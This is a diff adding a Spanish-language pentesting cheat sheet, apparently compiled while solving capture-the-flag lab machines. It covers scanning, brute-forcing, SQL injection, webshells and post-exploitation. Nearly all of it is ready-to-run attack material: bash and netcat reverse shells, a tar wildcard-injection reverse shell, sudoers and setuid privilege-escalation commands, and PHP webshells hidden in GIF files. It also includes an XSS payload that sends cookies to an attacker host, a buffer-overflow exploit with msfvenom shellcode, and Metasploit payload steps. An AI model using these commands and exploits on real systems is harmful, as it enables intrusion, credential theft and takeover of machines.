@@ -1,0 +1,462 @@
+Enlaces:
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation
+http://www.dankalia.com/tutor/01005/0100501004.htm
+https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/
+
+
+- Recopilar info:
+
+
+nmap -p0-65535 -T5 -A 192.168.0.24
+nmap -p- -T4 -sS -O 10.0.1.3
+nmap -sSV -n -T5 IP
+nmap -p- -T5 -sS -A 192.168.3.13
+nmap -sV -v -O -A -T5 192.168.3.13 -p-
+nmap -sU -p1-1000 -n -r 192.168.3.23
+nmap -sS -p- -A -T5 192.168.0.17
+
+joomscan -u http://192.168.0.24:8081
+
+nikto -h http://IP:port -C all
+
+wfuzz -c -z file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --hc 404 http://192.168.107.135/FUZZ
+wfuzz -c -v -w /root/Documents/rockyou9.txt -H "User-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26" --hc 404 http://192.168.0.64:8008/NickIzL33t/FUZZ.html
+
+gobuster -u 192.168.1.103/amagicbridgeappearsatthechasm -w /root/Documents/magic_item2.txt
+
+dirb http://192.168.3.15/
+
+wpscan -u http://192.168.0.58/
+
+
+nc -u 192.168.3.23 666
+
+nc -l -p 4444
+
+snmp-check -t 192.168.11.5 -c death2all
+snmpwalk -v1 -c death2all 192.168.11.5
+snmpwalk -v1 -c death2allrw 192.168.11.5  | grep Locked
+snmpset -v 1 -c death2allrw 192.168.11.5 iso.3.6.1.2.1.1.6.0 s "Unlocked"
+snmpget -v 1 -c death2allrw 192.168.11.5 iso.3.6.1.2.1.1.6.0
+
+dig axfr @192.168.56.160
+
+smbclient -N -L \\192.168.0.17
+
+Escanear WebDAV:
+curl -v -X OPTIONS http://192.168.11.6/test
+
+Con proxy:
+curl -i -s -k  -X 'GET http://127.0.0.1' -H 'User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0' 'http://192.168.11.7:3128/'
+
+Despertar knock:
+for x in 7482 8279 9467; do nmap -sS --max-retries 0 -p $x 192.168.11.6; done
+
+
+- Cracking
+
+Hacer diccionario:
+Copio todas las palabras de una web en un archivo, quito las repetidas y lo ordeno.
+
+cat file.txt | tr  ' ' '\n'
+cat file.txt | sort | uniq > pass.txt
+
+cewl -d 0 -m 4 -v "http://www.d20srd.org/indexes/magicItems.htm" -w magic_item.txt
+
+cat magic_item.txt | tr [:upper:] [:lower:] > magic_item2.txt
+
+hydra -l tomcat -P /usr/share/wordlists/rockyou.txt -e nrs -s 8080 -vV 10.0.1.3 http-get /manager/html
+hydra -L ~/tools/SecLists/Usernames/top_shortlist.txt -P ~/tools/SecLists/Passwords/john.txt -u -s 25 192.168.3.12 ftp
+hydra -l demonslayer -P rockyou.txt 192.168.11.5 ssh
+hydra -V -l admin -P rockyou.txt -s 80 -f 192.168.0.60 http-post-form "/login.php:username=^USER^&pass=^PASS^&submit=Login:Login failed"
+hydra -V -L /usr/share/nmap/nselib/data/usernames.lst -P /usr/share/nmap/nselib/data/passwords.lst -s 80 -F 192.168.0.60 http-post-form "/?page=login.php:user=^USER^&pass=^PASS^&submit=Login:F=Login failed:H=Cookie: PHPSESSID=qurgvus8er3q9d713s2bmgqqo6"
+hydra -l elly -e nsr 192.168.0.17 ftp
+hydra -e nsr -L ./users 192.168.0.17 ssh
+hydra -V -l rmichaels -P imftodo.txt -t 10 -w 30  -s 80  192.168.11.6 http-post-form "/imfadministrator/:user=^USER^&pass=^PASS^&submit=Login:Invalid password"
+
+
+ncrack -p 22 --user demonslayer -v -P rockyou.txt -f 192.168.11.5
+
+fcrackzip -D -p ../rockyou.txt -u Whistler.zip 
+
+Script que prueba pass:
+
+#!/bin/bash
+
+passwdlist=$1
+echo "Brute forcing key..."
+while read password; do 
+    out=`curl -s -d "key=${password}" http://192.168.3.19/kzMb5nVYJw/index.php`
+    echo ${out} | grep "invalid key" >/dev/null
+    if [[ $? -ne 0 ]]; then
+        echo -e "Found key \e[32m${password}"
+        break
+    fi 
+done < ${passwdlist}
+
+./script.sh /usr/share/dict/words
+
+https://crackstation.net/
+
+john --wordlist=rockyou.txt --format=Raw-MD5 flag1.txt
+john --show --format=Raw-MD5 flag.txt
+
+rar2john crocs.rar > hashcrocs
+john hashcrocs --wordlist=dmsongs-sinespacios.txt
+
+unshadow passwd shadow > filetocrack
+john --wordlist=/usr/share/john/password.lst --rules filetocrack 
+john --format=crypt filetocrack
+
+aircrack-ng -w rockyou.txt -e "community" necromancer.cap
+
+
+wpscan --url https://192.168.0.17:12380/blogblog/ --wordlist /root/Documents/rockyou.txt --threads 50
+wpscan --url http://192.168.0.64/prehistoricforest --enumerate u
+wpscan --url http://192.168.0.64/prehistoricforest --wordlist /root/Documents/rockyou.txt --username tom
+
+echo "V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi" | base64 --decode
+
+
+cat dmsongs-ini.txt | tr '[:upper:]' '[:lower:]' > dmsongs-min.txt
+cat dmsongs-min.txt | sed 's/ //g' > dmsongs-sinespacios.txt
+cat dmsongs-ini.txt | sed 's/^ *//g' > dmsongs-ini-sinespaciosalprincipio.txt
+quito lineas en blanco:
+sed '/^$/d' dmsongs-ini-sinespaciosalprincipio.txt > dmsongs.txt
+
+
+crunch 13 13 -t bev,%%@@^1995 > dicc.lst
+
+
+- Shell y payloads
+
+Payload en tomcat:
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.22.4 LPORT=12345 -f war > r_jsp_shell_12345.war
+nc -nlvp 12345
+curl http://10.0.22.5:8080/r_jsp_shell_12345/
+
+msfvenom -l | grep php
+
+msfvenom -p php/meterpreter_reverse_tcp lhost=192.168.11.5 lport=443 -f raw > phpreter.php
+
+
+
+- Postataque:
+
+Conseguir shell decente:
+python -c ‘import pty; pty.spawn(“/bin/sh”)’
+o
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
+python /tmp/asdf.py
+
+Encontrar archivos con setuid:
+find / -perm -4000 -type f 2>/dev/null
+find /bin -user root -perm -4000
+find / -perm -0002 -type f 2>/dev/null | grep -v "/proc/"
+find / -type f \( -perm /4000 -a -user root \) -ls -o \( -perm /2000 -a -group root \) -ls 2> /dev/null < root \) -ls -o \( -perm /2000 -a -group root \) -ls 2> /dev/null
+
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+
+find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print
+
+echo '/bin/sh' > cat
+chmod +x cat
+PATH=/home/kane:${PATH}
+export PATH
+
+/bin/echo %s >> /root/messages.txt
+;chmod u+s /bin/sh
+
+nmap --interactive 
+!sh
+
+sudo -l
+
+os.system('chmod u+s /bin/dash')
+
+http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt, se puede pasar un reverse shell:
+/var/www/html/>echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.52.138 1337 >/tmp/f" > shell.sh
+/var/www/html/>touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
+/var/www/html/>touch "/var/www/html/--checkpoint=1"
+
+awk -F':' '{ print $1 }' passwd > users
+
+vi file 1>&2
+:shell=/bin/bash
+:shell
+
+cat myfile.txt | tr -d '\n' > oneline.txt
+
+/bin/bash -i >& /dev/tcp/miIP/puerto 0>&1
+nohup /bin/bash >& /dev/tcp/myIP/port 0<&1 2>&1 &
+
+echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update2
+
+Buscar webshell a pelo:
+grep -Rn “shell_exec *(” /var/www
+
+
+echo -e "import commands\ncommands.getstatusoutput('chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers')" > connect.py 
+
+
+
+- Exploiting
+
+Para actualizar la base de datos exploit.db en kali (se usa en searchsploit):
+
+mkdir tmp
+cd tmp/
+wget https://github.com/offensive-security/exploit-database/archive/master.zip
+unzip -qq master.zip
+rsync -a exploit-database-master/ /usr/share/exploitdb/
+rm -rf master.zip exploit-database-master/
+
+searchsploit ubuntu 14.04
+
+python3 -m http.server 8123
+
+gcc exploit.c -o pwn
+chown +x pwn
+./pwn
+
+
+- Ataques SQL
+
+Aprende a usuar el burp:
+
+- Poner proxy local
+- Comprobar en burp las proxy-options
+- Intercept on
+- Vas a la página principal, admites la conexión (forward) y mandas la navegación al scope.
+- En target-site map seleccionas "Spider this host"
+- Paramos spider y en proxy-options marcamos en Intercept Server Responses la opción And URL
+- Intercept off
+- Navegamos por la web, metemos una comilla simple en alguna consulta y si peta la base de datos, es que es vulnerable a sqli. 
+- A partir de ahí usar el request y utilizar sqlmap
+
+sqlmap -r request.txt --level=5 --risk=3 --dbms=mysql --current-db
+sqlmap -r request.txt --level=5 --risk=3 --dbms=mysql -D seattle --tables
+sqlmap -r request.txt --level=5 --risk=3 --dbms=mysql -D seattle -T tblMembers --columns
+sqlmap -r request.txt --level=5 --risk=3 --dbms=mysql -D seattle -T tblMembers --dumps
+sqlmap -r request.txt -p type --dbms=mysql --dump --threads=5
+sqlmap -r request.txt --sql-shell
+sqlmap -u "http://192.168.3.15/details.php?prod=1&type=1" --user-agent "TEST" --level 5 --risk 3 --dbms mysql -p prod --sql-shell
+select "<?php passthru($_GET['cmd']); ?>" into outfile '/var/www/html/test.php';
+
+sqlmap -r request.txt -p type --dbms=mysql --dump --threads=5 
+
+' or '1'='1
+Path traversal con burpsuite:
+Hay que buscar interceptar una conexión de download, mandarla a intruder, sustituir la variable en "positions" y en "payload" seleccionar /usr/share/wfuzz/wordlist/injections/Traversal.txt
+Si quieres recuperar alguna request o lo que se ha bajado: Request in browser-current browser session
+
+Sqli automation with burpsuite:
+Lo mismo que lo anterior, pero buscando navegar por la web para buscar queries en php, como por ejemplo details.php?prod=1&type=1. Sustituimos la variables que queramos (clear antes) y luego elegir sql.txt
+
+sqlmap -u "http://192.168.3.19/kzMb5nVYJw/420search.php?usrtosearch=ramses" --risk=2 --dbms=MySQL --level=2 --dbs
+sqlmap -u "http://192.168.3.19/kzMb5nVYJw/420search.php?usrtosearch=ramses" --level=5 --risk=3 --dbms=mysql --current-db
+sqlmap -u "http://192.168.3.19/kzMb5nVYJw/420search.php?usrtosearch=ramses" --level=5 --risk=3 --dbms=mysql -D seth --tables
+sqlmap -u "http://192.168.3.19/kzMb5nVYJw/420search.php?usrtosearch=ramses" --level=5 --risk=3 --dbms=mysql -D seth -T users --dump
+
+sqlmap -u "http://192.168.0.60/?page=login" --cookie="PHPSESSID=0renga3826padhmv1e845e17b1" --level=5 --risk=3 --dbms=MySQL --dbs
+
+sqlmap -u 'http://192.168.0.62/image.php?src=http://127.0.0.1:8080/checkpromo.php?promcode=*' --level=5 --risk=3 --dbms=mysql --technique=B --random-agent --dump-all --retries=20 --no-cast --common-tables --tamper=chardoubleencode
+sqlmap -u 'http://192.168.0.62/image.php?src=http://127.0.0.1:8080/checkpromo.php?promocode=*' --level=5 --risk=3 --dbms=mysql --technique=B --random-agent -D fancydb -T users --dump --retries=20 --no-cast  --tamper=chardoubleencode
+
+sqlmap con proxy:
+sqlmap -u "http://127.0.0.1/wolfcms/?/admin/login/" --proxy "http://192.168.11.7:3128" --level=5 --risk=3 --dbms=mysql --current-db
+
+
+
+-Ataques PHP
+
+Creamos un phpshell sencillo en la kali:
+cd pruebas/
+cp /usr/share/webshells/php/php-reverse-shell.php knx.txt
+
+Editamos knx.txt para que el shell apunte a la ip de la kali y lo dejamos en el puerto 1234
+Abrimos un nc -lvvp 1234
+
+Arrancamos el server www en kali:
+cd pruebas/
+python3 -m http.server 80
+python -s SimpleHttpBrowser 8888
+
+
+En el Repeater de burp, pulsamos go y a jugar con la shell.....
+
+
+http://192.168.0.60/?page=php://filter/convert.base64-encode/resource=config
+Cookie: lang=../upload/daf280af792fd5b906511363ae2bc39d.gif
+
+
+Ponemos un webshell subiendolo como plugin del wordpress, por ejemplo expl.php
+
+https://192.168.0.17:12380/blogblog/wp-content/uploads/expl.php
+
+Subir a WebDAV un phpshell:
+
+nmap --script http-put ....
+o
+curl -T phpreter.php -H "Expect: " http://192.168.11.6/test/
+
+
+Parsear control de waf para cargar un phpshell en un jpg:
+
+echo 'FFD8FFEo' | xxd -r -p > test.gif
+echo '<?php $c=$_GET['c']; echo `$c`; ?>' >> test.gif
+GET / <?php system ($_REQUEST['cmd']); ?>
+
+Visitar phpshell con curl:
+curl "http://192.168.11.6/imfadministrator/uploads/56feb015cb8b.gif?c=wget+192.168.11.5/funtimes"
+curl "http://192.168.11.6/imfadministrator/uploads/56feb015cb8b.gif?c=chmod+777+funtimes"
+
+
+
+-XSS
+
+<script>alert(123)</script>
+
+cat index.php
+<?php
+$cookie = isset($_GET["gimme"])?$_GET['gimme']:"";
+?>
+
+Ejecutar en tu kali:
+php -S IP:Port 
+php -S 192.168.11.5:80
+
+Inyectar en la web vulnerable:
+<script>location.href='http://IP/index.php?gimme='+document.cookie;</script>
+<script>location.href='http://192.168.11.5/index.php?gimme='+document.cookie;</script>
+
+sqlmap -u "http://192.168.11.6/admin/edit.php?id=1" --cookie="PHPSESSID=hl7kki7poouj07au2hi3jqkjl0" --level=5 --risk=3 --dump
+sqlmap -u "http://192.168.11.6/admin/edit.php?id=1" --cookie="PHPSESSID=hl7kki7poouj07au2hi3jqkjl0" --level=5 --risk=3 --columns
+sqlmap -u "http://192.168.11.6/admin/edit.php?id=1" --cookie="PHPSESSID=hl7kki7poouj07au2hi3jqkjl0" --level=5 --risk=3 --dbms=mysql -D blog --tables
+sqlmap -u "http://192.168.11.6/admin/edit.php?id=1" --cookie="PHPSESSID=hl7kki7poouj07au2hi3jqkjl0" --level=5 --risk=3 --dbms=mysql -D blog -T users --columns
+sqlmap -u "http://192.168.11.6/admin/edit.php?id=1" --cookie="PHPSESSID=hl7kki7poouj07au2hi3jqkjl0" --level=5 --risk=3 --dbms=mysql -D blog -T users --dump
+
+
+- Steganography
+
+strings -10 SkyDogCon_CTF.jpg
+hexdump -C SkyDogCon_CTF.jpg  | less +/"ff d9"
+convert Sky...jpg convertida.jpg
+exiftool
+binwalk -B pileoffeathers.jpg 
+foremost pileoffeathers.jpg 
+
+Limpiamos la imagen que vayamos a usar:
+jhead -purejpg bomb.jpg
+La editamos para poner la webshell:
+jhead -ce bomb.jpg
+
+Con poner la cabecera GIF al principio de la shell también bastaría:
+
+
+- Reversing
+
+sudo dpkg --add-architecture i386
+sudo apt-get update
+sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386
+
+objdump -x ./talisman
+
+gdb-peda$ peda checksec 
+
+Calculamos el offset:
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 300 -q 0x41366641
+[*] Exact match at offset 168
+
+Creamos el exploit:
+
+import socket
+from struct import *
+
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect(('192.168.11.6', 7788))
+client.recv(1024)
+client.send("48093572\n")
+client.recv(1024)
+client.send("3\n")
+client.recv(1024)
+
+# shellcode from msfvenom
+buf =  ""
+buf += "\xb8\x5c\xb3\xf3\x2d\xd9\xc6\xd9\x74\x24\xf4\x5e\x29"
+buf += "\xc9\xb1\x12\x83\xc6\x04\x31\x46\x11\x03\x46\x11\xe2"
+buf += "\xa9\x82\x28\xda\xb2\xb6\x8d\x76\x5e\x3b\xa2\x1f\x17"
+buf += "\xda\x0f\x5f\xb0\x46\xf8\xa0\x16\x73\xfd\x48\x64\x84"
+buf += "\xf9\x5a\xe1\x65\x6b\x3d\xa9\x35\x3d\x96\xc0\x57\xfe"
+buf += "\xd5\x52\x25\x06\x5f\x52\x5a\x09\x9f\xdb\xb9\xc8\x74"
+buf += "\xd7\xfc\x28\x86\x57\x83\x63\x17\xcc\xf5\x9d\x81\x44"
+buf += "\x09\xee\xb1\x65\x92\xf1\x57"
+
+# padding
+buf += "A" * (168 - len(buf))
+
+# call eax gadget
+buf += "\x63\x85\x04\x08\n"
+client.send(buf)
+client.recv(1024)
+client.close()
+
+print "Check for shell"
+
+
+
+- Metasploit
+
+Cuando arrancamos el proftpd local en dg, tenemos que forwardear la conexion del puerto 2121 a nuestra maquina atacante(ej. 6666), para eso desde meterpreter:
+
+portfw add -L 127.0.0.1 -l 6666 -p 2121 -r 127.0.0.1
+
+Ctrl+Z (background sessions)
+
+
+use exploit/unix/ftp/proftpd_133c_backdoor 
+set payload cmd/unix/reverse_perl
+show options
+set RPORT 6666
+set rhost 127.0.0.1
+run
+set lhost 192.168.0.12
+show options
+set lport 3333
+
+
+set payload cmd/unix/reverse
+show options
+set lhost 192.168.0.12
+set lport 4141
+show options
+exploit 
+sessions -l
+sessions -i 4
+sessions -u 4
+
+
+use multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.11.5
+set lport 443
+exploit -j
+
+
+msfvenom -p windows/exec cmd=calc.exe -e x86/alpha_mixed  -a x86 -f c --platform windows
+
+Crear un payload de meterpreter:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.11.5 LPORT=4444 -f elf > funtimes
+
+Recogerlo en metaslploit:
+use multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set lhost 192.168.11.5
+set lport 4444
+exploit -j
+
+portfwd add -l 7788 -p 7788 -r 127.0.0.1
+
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.11.5 LPORT=4444 -f python -b "\x00\x0a\x0d"
